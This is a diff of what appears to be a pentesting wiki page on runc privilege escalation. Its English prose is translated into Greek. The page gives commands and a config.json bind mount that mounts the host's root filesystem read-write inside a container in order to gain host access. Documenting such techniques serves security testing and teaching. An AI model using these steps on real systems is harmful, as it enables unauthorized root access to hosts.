@@ -4,7 +4,7 @@
 
 ## Basic information
 
-If you want to learn more about **runc** check the following page:
+Αν θέλετε να μάθετε περισσότερα για το **runc** ελέγξτε την παρακάτω σελίδα:
 
 {{#ref}}
 ../../network-services-pentesting/2375-pentesting-docker.md
@@ -12,22 +12,21 @@ If you want to learn more about **runc** check the following page:
 
 ## PE
 
-If you find that `runc` is installed in the host you may be able to **run a container mounting the root / folder of the host**.
-
+Αν διαπιστώσετε ότι το `runc` είναι εγκατεστημένο στον host, μπορεί να είστε σε θέση να **τρέξετε ένα container που να προσαρτά τον ριζικό / φάκελο του host**.
 ```bash
 runc -help #Get help and see if runc is intalled
 runc spec #This will create the config.json file in your current folder
 
 Inside the "mounts" section of the create config.json add the following lines:
 {
-    "type": "bind",
-    "source": "/",
-    "destination": "/",
-    "options": [
-        "rbind",
-        "rw",
-        "rprivate"
-    ]
+"type": "bind",
+"source": "/",
+"destination": "/",
+"options": [
+"rbind",
+"rw",
+"rprivate"
+]
 },
 
 #Once you have modified the config.json file, create the folder rootfs in the same directory
@@ -37,8 +36,7 @@ mkdir rootfs
 # The root folder is the one from the host
 runc run demo
 ```
-
 > [!CAUTION]
-> This won't always work as the default operation of runc is to run as root, so running it as an unprivileged user simply cannot work (unless you have a rootless configuration). Making a rootless configuration the default isn't generally a good idea because there are quite a few restrictions inside rootless containers that don't apply outside rootless containers.
+> Αυτό δεν θα λειτουργεί πάντα καθώς η προεπιλεγμένη λειτουργία του runc είναι να εκτελείται ως root, οπότε η εκτέλεσή του ως μη προνομιούχος χρήστη απλά δεν μπορεί να λειτουργήσει (εκτός αν έχετε μια ρύθμιση χωρίς root). Η ρύθμιση μιας προεπιλεγμένης ρύθμισης χωρίς root γενικά δεν είναι καλή ιδέα επειδή υπάρχουν αρκετοί περιορισμοί μέσα σε κοντέινερ χωρίς root που δεν ισχύουν έξω από κοντέινερ χωρίς root.
 
 {{#include ../../banners/hacktricks-training.md}}
